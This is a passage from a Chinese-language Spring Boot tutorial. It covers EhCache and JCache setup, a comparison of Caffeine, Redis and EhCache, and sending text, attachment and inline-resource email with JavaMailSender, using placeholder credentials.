class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.cache<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cache-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- EhCache 3 实现 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.ehcache<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ehcache<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>② 创建配置文件 <code>ehcache.xml</code></strong>：</p>
<p>在 <code>src/main/resources</code> 目录下创建 <code>ehcache.xml</code> 文件来定义缓存。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">config</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns</span>=<span class="string">&quot;http://www.ehcache.org/v3&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.ehcache.org/v3 http://www.ehcache.org/schema/ehcache-core-3.0.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 定义一个名为 &quot;users&quot; 的缓存 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cache</span> <span class="attr">alias</span>=<span class="string">&quot;users&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key-type</span>&gt;</span>java.lang.Long<span class="tag">&lt;/<span class="name">key-type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value-type</span>&gt;</span>com.example.myapp.model.User<span class="tag">&lt;/<span class="name">value-type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">expiry</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 缓存 10 分钟 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ttl</span> <span class="attr">unit</span>=<span class="string">&quot;minutes&quot;</span>&gt;</span>10<span class="tag">&lt;/<span class="name">ttl</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">expiry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 堆内存中最多存储 100 个条目 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">heap</span> <span class="attr">unit</span>=<span class="string">&quot;entries&quot;</span>&gt;</span>100<span class="tag">&lt;/<span class="name">heap</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">cache</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>③ 修改配置 (<code>application.yml</code>)：</strong></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="comment"># 1. 告诉 Spring Boot 使用 JCache (EhCache 是其实现)</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">jcache</span></span><br><span class="line">    <span class="comment"># 2. 指定 JCache 配置文件的位置</span></span><br><span class="line">    <span class="attr">jcache:</span></span><br><span class="line">      <span class="attr">config:</span> <span class="string">classpath:ehcache.xml</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-3-4-总结与对比"><a href="#2-3-4-总结与对比" class="headerlink" title="2.3.4 总结与对比"></a>2.3.4 总结与对比</h4><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">Caffeine</th>
<th align="left">Redis</th>
<th align="left">EhCache</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>类型</strong></td>
<td align="left"><strong>本地缓存</strong> (In-Memory)</td>
<td align="left"><strong>分布式缓存</strong> (Remote)</td>
<td align="left"><strong>本地缓存</strong> (In-Memory, Disk)</td>
</tr>
<tr>
<td align="left"><strong>适用场景</strong></td>
<td align="left">单体应用、高性能读缓存</td>
<td align="left">微服务、分布式集群、需要数据共享</td>
<td align="left">JCache 标准项目、需要磁盘持久化的单体应用</td>
</tr>
<tr>
<td align="left"><strong>数据共享</strong></td>
<td align="left">否 (各实例独立)</td>
<td align="left">是 (所有实例共享)</td>
<td align="left">否 (可持久化到磁盘)</td>
</tr>
<tr>
<td align="left"><strong>性能</strong></td>
<td align="left"><strong>极高</strong> (无网络开销)</td>
<td align="left">高 (有网络开销)</td>
<td align="left">较高 (磁盘模式下较慢)</td>
</tr>
<tr>
<td align="left"><strong>依赖</strong></td>
<td align="left">仅 Java 库</td>
<td align="left">需要独立的 Redis Server</td>
<td align="left">仅 Java 库</td>
</tr>
<tr>
<td align="left"><strong>配置复杂度</strong></td>
<td align="left">简单 (yml)</td>
<td align="left">中等 (yml + 序列化配置)</td>
<td align="left">中等 (yml + xml)</td>
</tr>
</tbody></table>
<hr>
<h2 id="3-邮件发送-Mail"><a href="#3-邮件发送-Mail" class="headerlink" title="3. 邮件发送 (Mail)"></a>3. 邮件发送 (Mail)</h2><p>在现代 Web 应用中，邮件发送是一项基础且不可或缺的功能，广泛应用于用户注册验证、消息通知、营销推广等场景。</p>
<p>Spring Framework 通过 <code>spring-context-support</code> 模块提供了对 JavaMail API 的高级抽象，极大地简化了邮件发送的实现。开发者无需再处理底层的、复杂的邮件协议（如 SMTP）和会话管理，只需与 Spring 提供的高层接口交互即可。</p>
<h3 id="3-1-JavaMailSender"><a href="#3-1-JavaMailSender" class="headerlink" title="3.1 JavaMailSender"></a>3.1 <code>JavaMailSender</code></h3><p><code>JavaMailSender</code> 是 Spring 邮件抽象的核心接口，它继承自 JavaMail 的 <code>MailSender</code> 接口，并为其增加了对 <code>MimeMessage</code> 的支持，使其能够发送更复杂的邮件（如包含 HTML 内容、附件或内联图片的邮件）。</p>
<p>你可以将 <code>JavaMailSender</code> 理解为 Spring 为你准备好的一个“邮件发送客户端”，它已经封装好了所有与邮件服务器通信的细节。</p>
<h4 id="3-1-1-集成-spring-boot-starter-mail"><a href="#3-1-1-集成-spring-boot-starter-mail" class="headerlink" title="3.1.1 集成 spring-boot-starter-mail"></a>3.1.1 集成 <code>spring-boot-starter-mail</code></h4><p>Spring Boot 提供了专门的 Mail Starter，它会自动配置 <code>JavaMailSender</code> Bean，我们只需要添加依赖并提供必要的配置。</p>
<p><strong>① 添加 Maven 依赖：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-mail<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>② 在 <code>application.yml</code> 中配置邮件服务器信息：</strong></p>
<p>以 QQ 邮箱为例（其他邮箱类似，如 163、Gmail 等）。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">mail:</span></span><br><span class="line">    <span class="comment"># 邮件服务器地址</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">smtp.qq.com</span></span><br><span class="line">    <span class="comment"># 邮件服务器端口 (SSL 加密通常是 465 或 587)</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">465</span></span><br><span class="line">    <span class="comment"># 发件人邮箱账号</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">your-email@qq.com</span></span><br><span class="line">    <span class="comment"># 关键：这里不是邮箱的登录密码，而是开启 SMTP 服务后生成的 &quot;授权码&quot;</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">your-authorization-code</span></span><br><span class="line">    <span class="comment"># 协议</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">smtp</span></span><br><span class="line">    <span class="comment"># 其他属性</span></span><br><span class="line">    <span class="attr">properties:</span></span><br><span class="line">      <span class="attr">mail:</span></span><br><span class="line">        <span class="attr">smtp:</span></span><br><span class="line">          <span class="comment"># 开启 SSL 加密</span></span><br><span class="line">          <span class="attr">ssl:</span></span><br><span class="line">            <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">          <span class="comment"># 身份验证</span></span><br><span class="line">          <span class="attr">auth:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>重要提示</strong>：<code>spring.mail.password</code> 属性对于大多数公共邮箱服务（如 QQ、163、Gmail）来说，<strong>不是你的登录密码</strong>，而是在邮箱设置中开启 SMTP 服务时生成的专用<strong>授权码</strong>或<strong>应用密码</strong>。</p>
</blockquote>
<hr>
<h4 id="3-1-2-注入并使用-JavaMailSender"><a href="#3-1-2-注入并使用-JavaMailSender" class="headerlink" title="3.1.2 注入并使用 JavaMailSender"></a>3.1.2 注入并使用 <code>JavaMailSender</code></h4><p>配置完成后，Spring Boot 会自动创建一个 <code>JavaMailSender</code> 的实例并放入 IoC 容器。我们可以在任何 Spring Bean（如 <code>@Service</code>）中直接 <code>@Autowired</code> 注入它。</p>
<p><strong>1. 发送简单文本邮件 (<code>SimpleMailMessage</code>)</strong></p>
<p><code>SimpleMailMessage</code> 是一个简单的 JavaBean，用于封装纯文本邮件的基本信息。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MailService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JavaMailSender mailSender;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从配置文件中获取发件人邮箱</span></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.mail.username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String fromEmail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送一封简单的文本邮件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> to 收件人地址</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> subject 邮件主题</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> content 邮件正文</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendSimpleMail</span><span class="params">(String to, String subject, String content)</span> &#123;</span><br><span class="line">        <span class="type">SimpleMailMessage</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleMailMessage</span>();</span><br><span class="line">        message.setFrom(fromEmail); <span class="comment">// 发件人</span></span><br><span class="line">        message.setTo(to); <span class="comment">// 收件人</span></span><br><span class="line">        message.setSubject(subject); <span class="comment">// 主题</span></span><br><span class="line">        message.setText(content); <span class="comment">// 正文</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mailSender.send(message);</span><br><span class="line">            System.out.println(<span class="string">&quot;简单邮件发送成功！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;发送简单邮件时发生异常！&quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2. 发送复杂邮件 (<code>MimeMessage</code>)</strong></p>
<p>对于需要发送 HTML、附件或内联图片的邮件，我们需要使用 <code>MimeMessage</code>。Spring 提供了 <code>MimeMessageHelper</code> 类来简化 <code>MimeMessage</code> 的创建过程。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MailService</span> &#123;</span><br><span class="line">    <span class="comment">// ... (注入 mailSender 和 fromEmail 同上)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送一封复杂的邮件（HTML + 附件 + 内联资源）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> to 收件人</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> subject 主题</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> htmlContent HTML 内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> attachmentPath 附件路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inlineImagePath 内联图片路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> rscId 内联资源的 Content-ID</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendComplexMail</span><span class="params">(String to, String subject, String htmlContent,</span></span><br><span class="line"><span class="params">                                String attachmentPath, String inlineImagePath, String rscId)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个 MimeMessage 实例</span></span><br><span class="line">        <span class="type">MimeMessage</span> <span class="variable">mimeMessage</span> <span class="operator">=</span> mailSender.createMimeMessage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// MimeMessageHelper：true 表示创建一个 multipart message</span></span><br><span class="line">            <span class="type">MimeMessageHelper</span> <span class="variable">helper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeMessageHelper</span>(mimeMessage, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            helper.setFrom(fromEmail);</span><br><span class="line">            helper.setTo(to);</span><br><span class="line">            helper.setSubject(subject);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置 HTML 内容 (第二个参数 true 表示这是一个 HTML)</span></span><br><span class="line">            helper.setText(htmlContent, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加附件</span></span><br><span class="line">            <span class="keyword">if</span> (attachmentPath != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">FileSystemResource</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileSystemResource</span>(<span class="keyword">new</span> <span class="title class_">File</span>(attachmentPath));</span><br><span class="line">                <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> file.getFilename();</span><br><span class="line">                helper.addAttachment(fileName, file);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加内联资源 (例如，在 HTML 中通过 cid:rscId 引用)</span></span><br><span class="line">            <span class="comment">// &lt;img src=&#x27;cid:rscId&#x27; /&gt;</span></span><br><span class="line">            <span class="keyword">if</span> (inlineImagePath != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">FileSystemResource</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileSystemResource</span>(<span class="keyword">new</span> <span class="title class_">File</span>(inlineImagePath));</span><br><span class="line">                helper.addInline(rscId, res);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            mailSender.send(mimeMessage);</span><br><span class="line">            System.out.println(<span class="string">&quot;复杂邮件发送成功！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MessagingException e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;发送复杂邮件时发生异常！&quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-1-3-最佳实践与注意事项"><a href="#3-1-3-最佳实践与注意事项" class="headerlink" title="3.1.3 最佳实践与注意事项"></a>3.1.3 最佳实践与注意事项</h4><ul>
<li><strong>异步发送</strong>：邮件发送是一个网络 I&#x2F;O 操作，可能会有延迟，阻塞当前线程。在 Web 应用中，强烈建议将邮件发送操作<strong>异步化</strong>。只需在发送方法上添加 <code>@Async</code> 注解，并开启异步支持（<code>@EnableAsync</code>），即可让邮件在后台线程池中发送，从而立即响应用户请求。</li>
<li><strong>模板引擎</strong>：硬编码 HTML 字符串是不好的实践。应该集成模板引擎（如 Thymeleaf, FreeMarker）来动态生成邮件内容，实现视图与逻辑的分离，使邮件模板更易于维护。</li>
<li><strong>异常处理</strong>：邮件发送可能会因为网络问题、认证失败等原因抛出 <code>MailException</code>。必须进行适当的 <code>try-catch</code> 处理，记录日志，甚至可以实现失败重试机制。</li>
<li><strong>安全性</strong>：避免在代码中硬编码敏感信息（如邮箱密码&#x2F;授权码），应始终将其放在配置文件中，并通过版本控制系统（如 Git）的 <code>.gitignore</code> 文件忽略该配置文件，防止敏感信息泄露。</li>
</ul>
<hr>
<h3 id="3-2-发送简单邮件、附件邮件、内联资源邮件"><a href="#3-2-发送简单邮件、附件邮件、内联资源邮件" class="headerlink" title="3.2 发送简单邮件、附件邮件、内联资源邮件"></a>3.2 发送简单邮件、附件邮件、内联资源邮件</h3><p>在 <code>JavaMailSender</code> 的基础上，Spring 提供了不同的消息对象和辅助类来构建这三类邮件。我们将分别展示它们的具体实现。</p>
<p>为了方便演示，我们假设已经创建了一个 <code>MailService</code> 类，并注入了 <code>JavaMailSender</code> 和发件人邮箱地址 <code>fromEmail</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MailService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JavaMailSender mailSender;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.mail.username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String fromEmail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 下面的方法都将定义在这个类中 ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-2-1-发送简单文本邮件-Simple-Text-Mail"><a href="#3-2-1-发送简单文本邮件-Simple-Text-Mail" class="headerlink" title="3.2.1 发送简单文本邮件 (Simple Text Mail)"></a>3.2.1 发送简单文本邮件 (Simple Text Mail)</h4><p>这是最基础的邮件形式，只包含纯文本内容，没有任何格式、图片或附件。</p>
<ul>
<li><strong>核心类</strong>：<code>org.springframework.mail.SimpleMailMessage</code></li>
<li><strong>特点</strong>：构建简单，开销小，适用于发送验证码、系统通知等场景。</li>
</ul>
<p><strong>实现代码：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 发送一封简单的文本邮件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> to 收件人地址</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> subject 邮件主题</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> content 邮件正文 (纯文本)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendSimpleMail</span><span class="params">(String to, String subject, String content)</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个简单的邮件消息对象</span></span><br><span class="line">    <span class="type">SimpleMailMessage</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleMailMessage</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置邮件的基本信息</span></span><br><span class="line">    message.setFrom(fromEmail);</span><br><span class="line">    message.setTo(to);</span><br><span class="line">    message.setSubject(subject);</span><br><span class="line">    message.setText(content);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 发送邮件</span></span><br><span class="line">        mailSender.send(message);</span><br><span class="line">        System.out.println(<span class="string">&quot;简单文本邮件发送成功！&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;发送简单文本邮件时发生异常: &quot;</span> + e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-2-2-发送带附件的邮件-Mail-with-Attachments"><a href="#3-2-2-发送带附件的邮件-Mail-with-Attachments" class="headerlink" title="3.2.2 发送带附件的邮件 (Mail with Attachments)"></a>3.2.2 发送带附件的邮件 (Mail with Attachments)</h4><p>当需要在邮件中附加文件（如报告、发票、图片等）时，就需要创建一封 “multipart” (多部分) 格式的邮件。</p>
<ul>
<li><strong>核心类</strong>：<code>javax.mail.internet.MimeMessage</code></li>
<li><strong>辅助类</strong>：<code>org.springframework.mail.javamail.MimeMessageHelper</code></li>
<li><strong>关键方法</strong>：<code>helper.addAttachment(String attachmentFilename, InputStreamSource inputStreamSource)</code></li>
</ul>
<p><strong>实现代码：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 发送一封带附件的邮件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> to 收件人地址</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> subject 邮件主题</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> content 邮件正文 (可以是 HTML)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filePath 附件的文件路径</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendAttachmentMail</span><span class="params">(String to, String subject, String content, String filePath)</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个 MimeMessage 对象</span></span><br><span class="line">    <span class="type">MimeMessage</span> <span class="variable">mimeMessage</span> <span class="operator">=</span> mailSender.createMimeMessage();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 使用 MimeMessageHelper 来构建邮件，true 表示需要创建一个 multipart message</span></span><br><span class="line">        <span class="type">MimeMessageHelper</span> <span class="variable">helper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeMessageHelper</span>(mimeMessage, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置邮件的基本信息</span></span><br><span class="line">        helper.setFrom(fromEmail);</span><br><span class="line">        helper.setTo(to);</span><br><span class="line">        helper.setSubject(subject);</span><br><span class="line">        helper.setText(content, <span class="literal">true</span>); <span class="comment">// true 表示邮件内容为 HTML 格式</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加附件</span></span><br><span class="line">        <span class="type">FileSystemResource</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileSystemResource</span>(<span class="keyword">new</span> <span class="title class_">File</span>(filePath));</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> file.getFilename(); <span class="comment">// 获取文件名</span></span><br><span class="line">        <span class="keyword">if</span> (fileName != <span class="literal">null</span>) &#123;</span><br><span class="line">            helper.addAttachment(fileName, file);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送邮件</span></span><br><span class="line">        mailSender.send(mimeMessage);</span><br><span class="line">        System.out.println(<span class="string">&quot;附件邮件发送成功！&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (MessagingException e) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;发送附件邮件时发生异常: &quot;</span> + e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-2-3-发送带内联资源的邮件-Mail-with-Inline-Resources"><a href="#3-2-3-发送带内联资源的邮件-Mail-with-Inline-Resources" class="headerlink" title="3.2.3 发送带内联资源的邮件 (Mail with Inline Resources)"></a>3.2.3 发送带内联资源的邮件 (Mail with Inline Resources)</h4><p>内联资源（通常是图片）是指嵌入到邮件正文中、作为内容一部分显示的资源，而不是作为单独的附件。这常用于创建图文并茂的富文本邮件。</p>
<ul>
<li><strong>核心类</strong>：<code>javax.mail.internet.MimeMessage</code></li>
<li><strong>辅助类</strong>：<code>org.springframework.mail.javamail.MimeMessageHelper</code></li>
<li><strong>关键方法</strong>：<code>helper.addInline(String contentId, Resource resource)</code></li>
